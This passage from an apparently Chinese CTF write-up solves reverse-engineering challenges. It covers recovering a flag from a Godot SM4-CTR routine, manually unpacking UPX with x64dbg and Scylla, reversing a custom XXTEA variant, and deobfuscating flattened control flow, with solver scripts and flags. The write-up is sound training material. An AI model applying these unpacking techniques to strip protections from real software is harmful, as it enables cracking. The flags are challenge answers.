            ck = (ck << 8) | (((rnd * 4 + j) * 7) & 255)
        var mix := k[rnd + 1] ^ k[rnd + 2] ^ k[rnd + 3] ^ ck
        var rk := (k[rnd] ^ _key_l(_tau(mix))) & MASK
        k.append(rk)
        keys.append(rk)
    return keys

static func _block(block: PackedByteArray, key: PackedByteArray) -> PackedByteArray:
    var x: Array[int] = []
    for i in range(4):
        x.append(_load_u32(block, i * 4))
    for rk in _round_keys(key):
        var v := x[x.size() - 3] ^ x[x.size() - 2] ^ x[x.size() - 1] ^ rk
        var next := (x[x.size() - 4] ^ _l(_tau(v))) & MASK
        x.append(next)
    var result := PackedByteArray()
    for j in range(4):
        _put_u32(result, x[x.size() - 1 - j])
    return result

static func _ctr(cipher: PackedByteArray, key: PackedByteArray, nonce: PackedByteArray) -> PackedByteArray:
    var plain := PackedByteArray()
    for start in range(0, cipher.size(), 16):
        var iv := nonce.duplicate()
        _put_u32(iv, (start / 16) + 1)
        var stream := _block(iv, key)
        for i in range(mini(16, cipher.size() - start)):
            plain.append(cipher[start + i] ^ stream[i])
    return plain

static func open_record(seals: Array[PackedByteArray]) -> String:
    if seals.size() != 10:
        return ""
    for i in range(10):
        if seals[i] != golden_seal(i):
            return ""
    var data := FileAccess.get_file_as_bytes("res://assets/record.dat")
    if data.size() < 30:
        return ""
    if data.slice(0, 4) != "CLD1".to_ascii_buffer():
        return ""
    var count := (int(data[16]) << 8) | int(data[17])
    if data.size() != 18 + count + 8:
        return ""
    var nonce := data.slice(4, 16)
    var encrypted := data.slice(18, 18 + count)
    var output := _ctr(encrypted, _derive_key(seals), nonce)
    if _sha256(output).slice(0, 8) != data.slice(18 + count, data.size()):
        return ""
    var text := output.get_string_from_utf8()
    if not text.begins_with("flag{") or not text.ends_with("}"):
        return ""
    return text
```

`open_record` 函数读取了一个资源文件 `res://assets/record.dat` 然后自己实现了解密的流程。

所以理论上来说这个游戏通关了应该就会显示 flag？

![](https://img.halfcity.top/2026/11/10/3fbd99f18960092ac222594232735e75.png)

检查一下发现这个类根本就没有被引用过，所以无论怎么游玩都不可能得到 flag。如果有 godot 环境的话理论上将他挂载到随便一个节点就可以运行得到  flag 了。

但是下载一个 godot 环境太麻烦了，改包也是，这里我们可以参考它解密的逻辑自己实现一遍解密并获取 flag。

首先对 `slot = 0..9` 分别计算 SHA256，派生 16 字节密钥。

随后调用 CTR 解密。

解密脚本如下：

```py
import hashlib
from typing import List

SBOX_HEX = (
    "d690e9fecce13db716b614c228fb2c05"
    "2b679a762abe04c3aa44132649860699"
    "9c4250f491ef987a33540b43edcfac62"
    "e4b31ca9c908e89580df94fa758f3fa6"
    "4707a7fcf37317ba83593c19e6854fa8"
    "686b81b27164da8bf8eb0f4b70569d35"
    "1e240e5e6358d1a225227c3b01217887"
    "d40046579fd327524c3602e7a0c4c89e"
    "eabf8ad240c738b5a3f7f2cef96115a1"
    "e0ae5da49b341a55ad933230f58cb1e3"
    "1df6e22e8266ca60c02923ab0d534e6f"
    "d5db3745defd8e2f03ff6a726d6c5b51"
    "8d1baf92bbddbc7f11d95c411f105ad8"
    "0ac13188a5cd7bbd2d74d012b8e5b4b0"
    "8969974a0c96777e65b9f109c56ec684"
    "18f07dec3adc4d2079ee5f3ed7cb3948"
)
SBOX = bytes.fromhex(SBOX_HEX)
FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]
MASK = 0xffffffff


def sha256(data: bytes) -> bytes:
    return hashlib.sha256(data).digest()


def golden_seal(slot: int) -> bytes:
    phrase = f"CHALDEA/SEAL/v1|{slot}|LUMEN-2731".encode()
    return sha256(phrase)[4:12]


def derive_key(seals: List[bytes]) -> bytes:
    buf = b"CHALDEA/TENFOLD/MNEMOSYNE|"
    for i in range(10):
        buf += bytes([i]) + seals[i]
    buf += b"|STARS-ARE-WITNESSES"
    return sha256(buf)[:16]


def rol(x: int, n: int) -> int:
    x &= MASK
    return ((x << n) | (x >> (32 - n))) & MASK


def load_u32(b: bytes, at: int) -> int:
    return (b[at] << 24) | (b[at + 1] << 16) | (b[at + 2] << 8) | b[at + 3]


def put_u32(value: int) -> bytes:
    value &= MASK
    return bytes([
        (value >> 24) & 255,
        (value >> 16) & 255,
        (value >> 8) & 255,
        value & 255,
    ])


def tau(w: int) -> int:
    y = 0
    for j in range(4):
        shift = 24 - 8 * j
        y |= SBOX[(w >> shift) & 255] << shift
    return y & MASK


def L(w: int) -> int:
    return (w ^ rol(w, 3) ^ rol(w, 9) ^ rol(w, 17) ^ rol(w, 25)) & MASK


def key_L(w: int) -> int:
    return (w ^ rol(w, 13) ^ rol(w, 23)) & MASK


def round_keys(key: bytes) -> List[int]:
    k = [load_u32(key, i * 4) ^ FK[i] for i in range(4)]
    keys = []
    for rnd in range(24):
        ck = 0
        for j in range(4):
            ck = (ck << 8) | (((rnd * 4 + j) * 7) & 255)
        mix = k[rnd + 1] ^ k[rnd + 2] ^ k[rnd + 3] ^ ck
        rk = (k[rnd] ^ key_L(tau(mix))) & MASK
        k.append(rk)
        keys.append(rk)
    return keys


def sm4_block(block: bytes, key: bytes) -> bytes:
    x = [load_u32(block, i * 4) for i in range(4)]
    for rk in round_keys(key):
        v = x[-3] ^ x[-2] ^ x[-1] ^ rk
        nxt = (x[-4] ^ L(tau(v))) & MASK
        x.append(nxt)
    return b"".join(put_u32(x[-1 - j]) for j in range(4))


def ctr_decrypt(cipher: bytes, key: bytes, nonce: bytes) -> bytes:
    plain = bytearray()
    for start in range(0, len(cipher), 16):
        iv = nonce + put_u32((start // 16) + 1)  # 12-byte nonce + 4-byte counter
        stream = sm4_block(iv, key)
        for i in range(min(16, len(cipher) - start)):
            plain.append(cipher[start + i] ^ stream[i])
    return bytes(plain)


def open_record(path: str) -> str:
    seals = [golden_seal(i) for i in range(10)]
    key = derive_key(seals)

    data = open(path, "rb").read()
    if len(data) < 30 or data[:4] != b"CLD1":
        return ""

    count = (data[16] << 8) | data[17]
    if len(data) != 18 + count + 8:
        return ""

    nonce = data[4:16]
    encrypted = data[18 : 18 + count]
    tag = data[18 + count :]

    plain = ctr_decrypt(encrypted, key, nonce)
    if sha256(plain)[:8] != tag:
        return ""

    text = plain.decode("utf-8")
    if not (text.startswith("flag{") and text.endswith("}")):
        return ""
    return text


if __name__ == "__main__":
    flag = open_record("record.dat")
    print(flag)
```

```txt
flag{t3n_g0ld3n_summ0ns_unl0ck_th3_ch4ld34_4rch1v3}
```

### 阿萨拉下班指南·三：你架着，我拆个包

```txt
撤离前，队友又发现一份封好的机密包。“最后一个，真最后一个。”，这次的结构异常奇怪，看来只能靠你手动拆掉了
```

看这描述，应该要手脱 UPX 吧。

![](https://img.halfcity.top/2026/11/10/2627d3516fd9dc667f012e94fd30e8e5.png)

UPX 壳的特征码没有匹配，但是启发式检测还是发现了是 UPX。

UPX 是压缩壳，我们使用压缩壳最常用的 ESP 大法脱壳即可。

#### 脱壳

打开 x64dbg 断在系统断点，运行来到入口断点：

![](https://img.halfcity.top/2026/11/10/3615835f8d6e623be66292f6bc8eb748.png)

![](https://img.halfcity.top/2026/11/10/96e9447d1583001403f62da2c38f9f44.png)

在 x86 程序中开头应该是 `pushad` ，x64 程序是 `push rbx push rsi push rdi push rbp` ，不过都一样。

利用栈平衡我们可以断在壳最后的尾声部分。

在栈顶设置硬件写入断点：

![](https://img.halfcity.top/2026/11/10/dcf06ea424dbf5e35055f0abf0bb7a94.png)

F9 运行来到尾声：

![](https://img.halfcity.top/2026/11/10/82baa973597094927513b31aab28fe6d.png)

```txt
00007FF79CB7019F | E9 810FFEFF                 | jmp <challenge (1).sub_7FF79CB51125>                      |
```

这一条指令就是大跳了。

F4 运行到 jmp 指令，然后 F7 来到 OEP：

![](https://img.halfcity.top/2026/11/10/16cc224e194475b909cadfd1bede511d.png)

随后使用 Scylla 来 dump 脱壳后的程序即可。

先 dump 程序，然后解析 IAT，随后点 `Fix Dump` 修复 dump 程序的 IAT：

![](https://img.halfcity.top/2026/11/10/0cb7dcfc280b80500c79dc75a89302b5.png)

解析失败的条目先不管修复的时候直接删掉，有问题再说。

接下来就可以到 IDA 里分析了。

#### 静态分析

来到 start 并分析 mainCRTStartup() 找到 main 并重命名：

![](https://img.halfcity.top/2026/11/10/7a70004b19fc9d68e56ac0bdd8f9e703.png)

简单重命名一下：

![](https://img.halfcity.top/2026/11/10/0d20889532b4ae51350225a83c244003.png)

`sub_7FF7B80E17A1` 是前面题目见了很多次的 flag 内容提取函数。

`sub_7FF7B80E1A43` 就是要的加密逻辑了。

![](https://img.halfcity.top/2026/11/10/ce4d7f56b648f066ab63e848e89d525a.png)

这里先逐字节从 `qword_7FF7B80F4060` 填充了 3 个 QWORD 到 v4 后移交给 buf1，并从 `qword_7FF7B80F4080` 读取了四个 DWORD 给到 v2 并异或，这里的 v2 可能就是加密的 key 了。

![](https://img.halfcity.top/2026/11/10/5c90f9647ad905716d256abd98890fb8.png)

```c
__int64 __fastcall sub_7FF7B80E1892(unsigned int i, unsigned int a2, int a3, _QWORD *key, char j, int a6)
{
  return (((4 * a2) ^ (i >> 5)) + ((a2 >> 3) ^ (16 * i))) ^ ((a2 ^ a3) + (i ^ *((_DWORD *)key + (a6 ^ j & 3u))));
}
```

由此我们得到如下结论：

1. sub_7FF7B80E1892 是 TEA 系列混合函数，结构与 XXTEA 的 MX 混合表达式高度相似。

2. sub_7FF7B80E18F4 并不是标准 XXTEA 的直接实现：它使用了 6 个 32 位字、14 轮、每轮 5 次内层迭代，并且密钥索引、轮常量初始化方式都需要按反编译结果还原。
    外层 sub_7FF7B80E1A43 则是校验入口：先根据 qword_7FF7B80F4060 指定的偏移，从 a1 指向的内存中提取 24 字节，再进行变换，最后与 Buf2 的 24 字节常量比较。

  因此这里应该：

- 还原 128 位密钥：qword_7FF7B80F4080 的 16 字节数据，每个 DWORD 再与 0xA5A5A5A5 异或。
- 按照实际循环顺序逆向恢复变换，而不是直接套用标准 XXTEA 解密函数。


代码中的 `v7 -= 0x61C88647`

它是标准 XXTEA 常用常量 0x9E3779B9 的 32 位负数表示。

因此每轮的 sum 按照以下方式更新：

sum_ = (sum_ - 0x61C88647) & 0xFFFFFFFF

初始 sum 为 0，共执行 14 轮。

从 qword_7FF7B80F4080 读取 16 字节原始数据，并将每个 DWORD 与 0xA5A5A5A5 异或。

解密脚本如下：

```py

import struct

MASK = 0xFFFFFFFF
DELTA_NEG = 0x61C88647
KEY_XOR = 0xA5A5A5A5

RAW_KEY = bytes.fromhex(
    "B2 99 FF C8 A2 11 47 34 "
    "99 88 BB AA 7D 62 13 00"
)

# 每个 DWORD 与 0xA5A5A5A5 异或
KEY = [
    x ^ KEY_XOR
    for x in struct.unpack("<4I", RAW_KEY)
]

TARGET = bytes.fromhex(
    "30 9E 9E 82 32 03 BE DA "
    "AF 24 30 0B DA 97 C8 81 "
    "62 84 AA 46 EA E3 C6 FB"
)

OFFSETS = [
    1, 6, 11, 16, 21,
    2, 7, 12, 17, 22,
    3, 8, 13, 18, 23,
    4, 9, 14, 19, 0,
    5, 10, 15, 20,
]


def mx(z, y, sum_, p, e):
    """还原 sub_7FF7B80E1892，所有运算按 uint32 处理。"""
    left = (
        (((y << 2) & MASK) ^ (z >> 5))
        + ((y >> 3) ^ ((z << 4) & MASK))
    ) & MASK

    right = (
        ((y ^ sum_) + (z ^ KEY[e ^ (p & 3)])
    )) & MASK

    return left ^ right


def decrypt_block(ciphertext):
    """逆向 sub_7FF7B80E18F4。"""
    v = list(struct.unpack("<6I", ciphertext))

    # 正向执行 14 轮后的 sum
    sum_ = 0
    for _ in range(14):
        sum_ = (sum_ - DELTA_NEG) & MASK

    # 逆序执行每轮
    for _ in range(14):
        e = (sum_ >> 2) & 3

        # 正向最后更新 word[5]，因此逆向先撤销它
        v[5] = (
            v[5] - mx(v[4], v[0], sum_, 5, e)
        ) & MASK

        # 逆向撤销 word[4] 到 word[0] 的更新
        for p in range(4, -1, -1):
            z = v[p - 1] if p > 0 else v[5]

            v[p] = (
                v[p] - mx(z, v[p + 1], sum_, p, e)
            ) & MASK

        # 回到上一轮的 sum
        sum_ = (sum_ + DELTA_NEG) & MASK

    return struct.pack("<6I", *v)


def restore_original(extracted):
    """逆转外层的偏移提取操作。"""
    result = bytearray(24)

    for i, offset in enumerate(OFFSETS):
        result[offset] = extracted[i]

    return bytes(result)


def main():
    print("[+] Key:")
    print("    " + " ".join(f"{x:08X}" for x in KEY))

    extracted = decrypt_block(TARGET)

    print("\n[+] Decrypted 24 bytes:")
    print("    " + extracted.hex(" "))

    original = restore_original(extracted)

    print("\n[+] Original bytes:")
    print("    " + original.hex(" "))

    print("\n[+] ASCII:")
    print("    " + original.decode("ascii"))


if __name__ == "__main__":
    main()
```

```txt
flag{unp4ck_while_team_covers}
```

### 提瓦特委托局·三：构造与混沌

跟着 mainCRTStartup 来到 main 函数：

```c
__int64 __fastcall sub_14000196F(__int64 a1)
{
  int v1; // ebx
  unsigned int v2; // eax
  __int64 result; // rax
  unsigned int v4; // [rsp+2Ch] [rbp-74h]
  _WORD v5[38]; // [rsp+30h] [rbp-70h]
  int m; // [rsp+7Ch] [rbp-24h]
  unsigned int v7; // [rsp+80h] [rbp-20h]
  int k; // [rsp+84h] [rbp-1Ch]
  int j; // [rsp+88h] [rbp-18h]
  unsigned int i; // [rsp+8Ch] [rbp-14h]
  int v11; // [rsp+90h] [rbp-10h]
  unsigned int v12; // [rsp+94h] [rbp-Ch]
  int v13; // [rsp+98h] [rbp-8h]
  unsigned int n5; // [rsp+9Ch] [rbp-4h]

  n5 = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  for ( i = 0; i <= 0xB; ++i )
  {
    v1 = rand() << 16;
    dword_1400190A0[i] = (0x9E3779B9 * i) ^ rand() ^ v1;
  }
  v4 = dword_1400190A0[0];
  while ( 2 )
  {
    switch ( sub_1400018AB(a1: v4) )
    {
      case 0LL:
        for ( j = 0; j <= 23; ++j )
          *((_BYTE *)&v5[24] + j) = *(_BYTE *)(byte_140014070[j] + a1);
        n5 = 0;
        v4 = sub_1400018F3(0, 0);
        continue;
      case 1LL:
        v4 = sub_1400018F3(1, n5 <= 5);
        continue;
      case 2LL:
        for ( k = 0; k <= 3; ++k )
        {
          v7 = word_1400140C0[4 * n5 + k];
          for ( m = 0; m <= 3; ++m )
            v7 += word_1400140A0[4 * k + m] * *((unsigned __int8 *)&v5[2 * n5 + 24] + m);
          v5[4 * n5 + k] = v7 % 0x101;
        }
        v4 = sub_1400018F3(2, 0);
        continue;
      case 3LL:
        v11 ^= (unsigned __int16)v5[4 * n5] ^ (157 * n5);
        v4 = sub_1400018F3(3, v11 & 1);
        continue;
      case 4LL:
        ++n5;
        v4 = sub_1400018F3(4, 0);
        continue;
      case 5LL:
        v13 = 0;
        v4 = sub_1400018F3(5, 0);
        continue;
      case 6LL:
        if ( v5[v13] == aYmGec1[v13] )
          v2 = sub_1400018F3(6, 1);
        else
          v2 = sub_1400018F3(6, 0);
        v4 = v2;
        continue;
      case 7LL:
        if ( (unsigned int)++v13 > 0x17 )
          v4 = sub_1400018F3(7, 1);
        else
          v4 = sub_1400018F3(7, 0);
        continue;
      case 8LL:
        v12 = 1;
        v4 = sub_1400018F3(8, 0);
        continue;
      case 9LL:
        v12 = 0;
        v4 = sub_1400018F3(9, 0);
        continue;
      case 10LL:
        result = v12;
        break;
      case 11LL:
        v11 ^= 0x13579BDFu;
        v4 = sub_1400018F3(11, v11 & 1);
        continue;
      default:
        result = 0;
        break;
    }
    return result;
  }
}
```

这里可以看出来有点像 ollvm 的控制流平坦化，不过理论上来说 ollvm 不会这么简单，所以这里应该是一个自定义的控制流。

这里只有一个主 handler，12个分发块编号由 `sub_140018AB()` 来生成。可以看到每个块结束后都会调用 `sub_1400018F3` 迭代块编号。

```c
__int64 __fastcall sub_1400018AB(int a1)
{
  unsigned int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 0xB; ++i )
  {
    if ( a1 == dword_1400190A0[i] )
      return i;
  }
  return 11;
}
```

结合前面的内容可以确定这里固定了初始块是 0 号。

我们先简单将主程序的逻辑重命名还原一下：

![](https://img.halfcity.top/2026/11/10/7b8d2b088f6e4f681a9aadcec5e70737.png)

```c
__int64 __fastcall pick_next_block(int a1, unsigned int a2)
{
  dword_1400190D0 ^= rand();
  return (unsigned int)dword_1400190A0[byte_140014140[3 * a1 + a2 % 3]];
}
```

这里的 `byte_140014140` 这个数组保存了块的索引，那么 `sub_1400018F3` 就是根据编号反查索引了，到这里可能 ai 已经可以直接看出控制流了，但是这里我们还是按正常逻辑搞一个模拟执行的脚本来反混淆。

模拟脚本如下：

```py
import re

SRC = r"""
__int64 __fastcall encrypt(__int64 a1)
{
  n5 = 0; v23 = 0; v22 = 0; v21 = 0;
  state = select_index(dword_1400190A0[0]);
  while ( 2 )
  {
    switch ( state )
    {
      case 0LL:
        for ( j = 0; j <= 23; ++j )
          *((_BYTE *)&v15[24] + j) = *(_BYTE *)(byte_140014070[j] + a1);
        n5 = 0;
        block = pick_next_block(a1: 0, a2: 0);
        state = select_index(block);
        continue;
      case 1LL:
        block_1 = pick_next_block(a1: 1, a2: n5 <= 5);
        state = select_index(block_1);
        continue;
      case 2LL:
        for ( k = 0; k <= 3; ++k )
        {
          v17 = word_1400140C0[4 * n5 + k];
          for ( m = 0; m <= 3; ++m )
            v17 += word_1400140A0[4 * k + m] * *((unsigned __int8 *)&v15[2 * n5 + 24] + m);
          v15[4 * n5 + k] = v17 % 0x101;
        }
        block_2 = pick_next_block(a1: 2, a2: 0);
        state = select_index(block_2);
        continue;
      case 3LL:
        v21 ^= (unsigned __int16)v15[4 * n5] ^ (157 * n5);
        block_3 = pick_next_block(a1: 3, a2: v21 & 1);
        state = select_index(block_3);
        continue;
      case 4LL:
        ++n5;
        block_4 = pick_next_block(a1: 4, a2: 0);
        state = select_index(block_4);
        continue;
      case 5LL:
        v23 = 0;
        block_5 = pick_next_block(a1: 5, a2: 0);
        state = select_index(block_5);
        continue;
      case 6LL:
        if ( v15[v23] == aYmGec1[v23] )
          block_6 = pick_next_block(a1: 6, a2: 1u);
        else
          block_6 = pick_next_block(a1: 6, a2: 0u);
        state = select_index(block_6);
        continue;
      case 7LL:
        if ( (unsigned int)++v23 > 0x17 )
          block_7 = pick_next_block(a1: 7, a2: 1u);
        else
          block_7 = pick_next_block(a1: 7, a2: 0u);
        state = select_index(block_7);
        continue;
      case 8LL:
        v22 = 1;
        block_8 = pick_next_block(a1: 8, a2: 0);
        state = select_index(block_8);
        continue;
      case 9LL:
        v22 = 0;
        block_9 = pick_next_block(a1: 9, a2: 0);
        state = select_index(block_9);
        continue;
      case 10LL:
        result = v22;
        break;
      case 11LL:
        v21 ^= 0x13579BDFu;
        block_10 = pick_next_block(a1: 11, a2: v21 & 1);
        state = select_index(block_10);
        continue;
      default:
        result = 0;
        break;
    }
    return result;
  }
}
unsigned char byte_140014140[36] = {
    0x01,0x01,0x01, 0x05,0x02,0x02, 0x03,0x03,0x03, 0x04,0x04,0x04,
    0x01,0x01,0x01, 0x06,0x06,0x06, 0x09,0x07,0x07, 0x06,0x08,0x08,
    0x0A,0x0A,0x0A, 0x0A,0x0A,0x0A, 0x0A,0x0A,0x0A, 0x0A,0x0A,0x0A
};
"""

# ---------- 1. 取出 36 字节转移表 ----------
arr = re.search(r'byte_140014140\[36\]\s*=\s*\{(.*?)\}', SRC, re.S).group(1)
TBL = [int(x, 0) for x in re.findall(r'0x[0-9A-Fa-f]+|\d+', arr)]
assert len(TBL) == 36

# ---------- 2. 模拟 pick_next_block + select_index ----------
STATE = [(i + 1) * 0x1111 for i in range(12)]

def select_index(block):
    for i in range(12):
        if block == STATE[i]:
            return i
    return 11

def pick_next_block(a1, a2):
    return STATE[TBL[3 * a1 + (a2 % 3)]]

TRANS = {(c, a2): select_index(pick_next_block(c, a2))
         for c in range(12) for a2 in (0, 1)}

print("[*] 转移表 (case, a2) -> next")
for c in range(12):
    print(f"    case {c:2d}: a2=0 -> {TRANS[(c,0)]:2d}   a2=1 -> {TRANS[(c,1)]:2d}")

# ---------- 3. 把每个 case 的 body 切出来 ----------
fstart = SRC.index('__int64 __fastcall encrypt')
fend   = SRC.index('unsigned char byte_140014140')
fbody  = SRC[fstart:fend]

case_re = re.compile(r'case\s+(\d+)LL\s*:')
hits    = list(case_re.finditer(fbody))
spans   = {}
for i, m in enumerate(hits):
    cid = int(m.group(1))
    end = hits[i + 1].start() if i + 1 < len(hits) else fbody.find('default:', m.end())
    spans[cid] = fbody[m.end():end]

# ---------- 4. 抽取块的条件与语句 ----------
IF_RE  = re.compile(
    r'if\s*\((.+?)\)\s*\n'
    r'\s*\w+\s*=\s*pick_next_block\(a1:\s*(\d+),\s*a2:\s*1u\);'
    r'\s*\n\s*else\s*\n'
    r'\s*\w+\s*=\s*pick_next_block\(a1:\s*(\d+),\s*a2:\s*0u\);',
    re.S)
PNB_RE = re.compile(r'pick_next_block\(a1:\s*(\d+),\s*a2:\s*([^);]+?)\s*\)')

def strip_dispatch(text, has_if):
    lines = text.split('\n')
    nonempty = [l for l in lines if l.strip()]
    base = min(len(l) - len(l.lstrip()) for l in nonempty) if nonempty else 0
    out = []
    for raw in lines:
        if not raw.strip():
            continue
        s = re.sub(r'//.*$', '', raw[base:]).rstrip()
        if not s.strip():
            continue
        t = s.strip()
        if 'pick_next_block' in s: continue
        if 'select_index' in s: continue
        if t in ('continue;', 'break;', 'else'): continue
        if t.startswith(('state =', 'block_', 'result =')): continue
        if has_if and t.startswith('if'): continue
        out.append(s)
    return out

class Block:
    def __init__(self):
        self.stmts = []
        self.cond  = None
        self.t     = None
        self.f     = None
        self.ret   = False

def parse_case(cid, text):
    b = Block()
    ifm = IF_RE.search(text)
    if ifm:
        b.cond = ifm.group(1).strip()
        b.t = TRANS[(cid, 1)]
        b.f = TRANS[(cid, 0)]
        b.stmts = strip_dispatch(text, has_if=True)
    else:
        p = PNB_RE.search(text)
        if p:
            a2 = p.group(2).strip()
            if a2 in ('0', '0u', '1', '1u'):
                v = int(a2.rstrip('u'))
                b.t = b.f = TRANS[(cid, v)]
            else:
                b.cond = a2
                b.t = TRANS[(cid, 1)]
                b.f = TRANS[(cid, 0)]
        b.stmts = strip_dispatch(text, has_if=False)
    if cid == 10:
        b.ret = True
    return b

BLOCKS = {cid: parse_case(cid, txt) for cid, txt in spans.items()}

# ---------- 5. 输出纯 goto 形式 ----------
def emit_goto():
    L = []
    A = L.append
    print()
    A("__int64 __fastcall encrypt(__int64 a1)")
    A("{")
    A("    n5 = 0; v23 = 0; v22 = 0; v21 = 0;")
    A("")
    for cid in sorted(BLOCKS):
        b = BLOCKS[cid]
        A(f"B{cid}:")
        for s in b.stmts:
            A("    " + s)
        if b.ret:
            A("    return v22;")
        elif b.cond is not None and b.t != b.f:
            A(f"    if ({b.cond}) goto B{b.t}; else goto B{b.f};")
        else:
            tgt = b.t if b.t is not None else b.f
            A(f"    goto B{tgt};")
        A("")
    A("}")
    return "\n".join(L)

print(emit_goto())
```

输出如下：

```txt
> python recover.py
[*] 转移表 (case, a2) -> next
    case  0: a2=0 ->  1   a2=1 ->  1
    case  1: a2=0 ->  5   a2=1 ->  2
    case  2: a2=0 ->  3   a2=1 ->  3
    case  3: a2=0 ->  4   a2=1 ->  4
    case  4: a2=0 ->  1   a2=1 ->  1
    case  5: a2=0 ->  6   a2=1 ->  6
    case  6: a2=0 ->  9   a2=1 ->  7
    case  7: a2=0 ->  6   a2=1 ->  8
    case  8: a2=0 -> 10   a2=1 -> 10
    case  9: a2=0 -> 10   a2=1 -> 10
    case 10: a2=0 -> 10   a2=1 -> 10
    case 11: a2=0 -> 10   a2=1 -> 10

__int64 __fastcall encrypt(__int64 a1)
{
    n5 = 0; v23 = 0; v22 = 0; v21 = 0;

B0:
    for ( j = 0; j <= 23; ++j )
      *((_BYTE *)&v15[24] + j) = *(_BYTE *)(byte_140014070[j] + a1);
    n5 = 0;
    goto B1;

B1:
    if (n5 <= 5) goto B2; else goto B5;

B2:
    for ( k = 0; k <= 3; ++k )
    {
      v17 = word_1400140C0[4 * n5 + k];
      for ( m = 0; m <= 3; ++m )
        v17 += word_1400140A0[4 * k + m] * *((unsigned __int8 *)&v15[2 * n5 + 24] + m);
      v15[4 * n5 + k] = v17 % 0x101;
    }
    goto B3;

B3:
    v21 ^= (unsigned __int16)v15[4 * n5] ^ (157 * n5);
    goto B4;

B4:
    ++n5;
    goto B1;

B5:
    v23 = 0;
    goto B6;

B6:
    if (v15[v23] == aYmGec1[v23]) goto B7; else goto B9;

B7:
    if ((unsigned int)++v23 > 0x17) goto B8; else goto B6;

B8:
    v22 = 1;
    goto B10;

B9:
    v22 = 0;
    goto B10;

B10:
    return v22;

B11:
    v21 ^= 0x13579BDFu;
    goto B10;

}
```

虽然恢复了 handler 但是原有的逻辑不是线性的，还是需要自己识别一下 goto 的语意并恢复成正确逻辑。

这也没办法，也许重新编译一下让 ida 看会好点，但这里还是直接还原吧。

还原的逻辑如下：

```c
__int64 __fastcall encrypt(__int64 a1)
{
    uint16_t v15[38] = {0};
    int v21 = 0, v22 = 0, v23 = 0, n5 = 0;
    int j, k, m;
    unsigned int v17;

    // B0：按 byte_140014070 索引取 24 字节输入，写入 v15[24] 起始处
    for (j = 0; j <= 23; ++j)
        *((_BYTE *)&v15[24] + j) = *(_BYTE *)(byte_140014070[j] + a1);
    n5 = 0;

    // 循环 1（头 B1，条件 n5 <= 5）
    while (n5 <= 5) {
        // B2：4x4 矩阵乘 + 模 0x101
        for (k = 0; k <= 3; ++k) {
            v17 = word_1400140C0[4 * n5 + k];
            for (m = 0; m <= 3; ++m)
                v17 += word_1400140A0[4 * k + m] *
                       *((unsigned __int8 *)&v15[2 * n5 + 24] + m);
            v15[4 * n5 + k] = v17 % 0x101;
        }
        // B3：v21 是死变量，两条出边相同，保留原样
        v21 ^= (unsigned __int16)v15[4 * n5] ^ (157 * n5);
        // B4
        ++n5;
    }

    // B5
    v23 = 0;

    // 循环 2（头 B6/B7）
    while (1) {
        if (!(v15[v23] == aYmGec1[v23])) {   // B6 -> B9
            v22 = 0;
            break;
        }
        if (++v23 > 0x17) {                  // B7 -> B8
            v22 = 1;
            break;
        }
    }

    // B10
    return v22;
}
```

接下来就可以正常解密了。

从目标 UTF-16LE 字符串 aYmGec1 出发，按 6 组、每组 4 个 16 位值，减去对应常量，再乘以 4×4 矩阵的逆（模 257），得到 24 个明文字节。

最后按 byte_140014070 的逆置换把这些字节填回 a1 的对应偏移处。

```py
# 置换表
perm = [
    0x07, 0x0C, 0x11, 0x16, 0x03, 0x08, 0x0D, 0x12,
    0x17, 0x04, 0x09, 0x0E, 0x13, 0x00, 0x05, 0x0A,
    0x0F, 0x14, 0x01, 0x06, 0x0B, 0x10, 0x15, 0x02
]

# 矩阵 M
M = [
    [2, 1, 0, 0],
    [1, 1, 1, 0],
    [0, 1, 1, 1],
    [0, 0, 1, 2]
]

# 常量向量
C = [
    [1,  4,  7, 10],
    [12, 15, 18, 21],
    [23, 26, 29, 32],
    [34, 37, 40, 43],
    [45, 48, 51, 54],
    [56, 59, 62, 65]
]

aYmGec1 = [0x59, 0x4D, 0x3E, 0x2F, 0x47, 0x45, 0x43, 0x31, 0x26, 0x1A, 0x1B, 0x5C, 0x55, 0x64, 0x7A, 0x7F, 0x55, 0x27, 0x24, 0x27, 0x66, 0x71, 0x7D, 0x89]

MOD = 257

def extended_gcd(a, b):
    if b == 0:
        return a, 1, 0
    g, x, y = extended_gcd(b, a % b)
    return g, y, x - (a // b) * y

def mod_inv(a, m):
    g, x, _ = extended_gcd(a, m)
    if g != 1:
        raise ValueError(f"模逆不存在: {a} mod {m}")
    return x % m

def mat_inv_mod(M, mod):
    """求 4x4 矩阵在模 mod 下的逆矩阵"""
    n = len(M)
    # 构造增广矩阵 [M | I]
    A = [row[:] + [1 if i == j else 0 for j in range(n)] for i, row in enumerate(M)]
    
    for i in range(n):
        # 寻找主元
        pivot = None
        for r in range(i, n):
            if A[r][i] % mod != 0:
                pivot = r
                break
        if pivot is None:
            raise ValueError("矩阵不可逆")
        A[i], A[pivot] = A[pivot], A[i]
        
        # 归一化主元行
        inv_pivot = mod_inv(A[i][i], mod)
        for c in range(i, 2 * n):
            A[i][c] = (A[i][c] * inv_pivot) % mod
        
        # 消去其他行
        for r in range(n):
            if r != i and A[r][i] != 0:
                factor = A[r][i]
                for c in range(i, 2 * n):
                    A[r][c] = (A[r][c] - factor * A[i][c]) % mod
    
    # 提取逆矩阵
    inv = [row[n:] for row in A]
    return inv

def mat_vec_mul(M, v, mod):
    return [sum(M[i][j] * v[j] for j in range(len(v))) % mod for i in range(len(M))]

# 计算 M 的逆矩阵
M_inv = mat_inv_mod(M, MOD)
print("M_inv =", M_inv)

buf = [0] * 24

for n5 in range(6):
    # 取目标 Y（4 个 16 位值）
    Y = aYmGec1[4 * n5 : 4 * n5 + 4]
    # 减去常量
    D = [(Y[k] - C[n5][k]) % MOD for k in range(4)]
    # 左乘逆矩阵
    X = mat_vec_mul(M_inv, D, MOD)
    
    for k in range(4):
        if X[k] > 255:
            print(f"警告: 组 {n5} 元素 {k} 结果 {X[k]} > 255，可能目标值有误")
        buf[4 * n5 + k] = X[k] & 0xFF

# 逆置换
a1 = [0] * 24
for j in range(24):
    a1[perm[j]] = buf[j]

print("\n解密得到的 24 字节 (hex):")
print(' '.join(f'{b:02X}' for b in a1))

print("\n尝试按 ASCII 解码:")
print(bytes(a1).decode('ascii'))
```

输出如下：

```txt
> python cfg.py
M_inv = [[86, 86, 85, 86], [86, 85, 87, 85], [85, 87, 85, 86], [86, 85, 86, 86]]

解密得到的 24 字节 (hex):
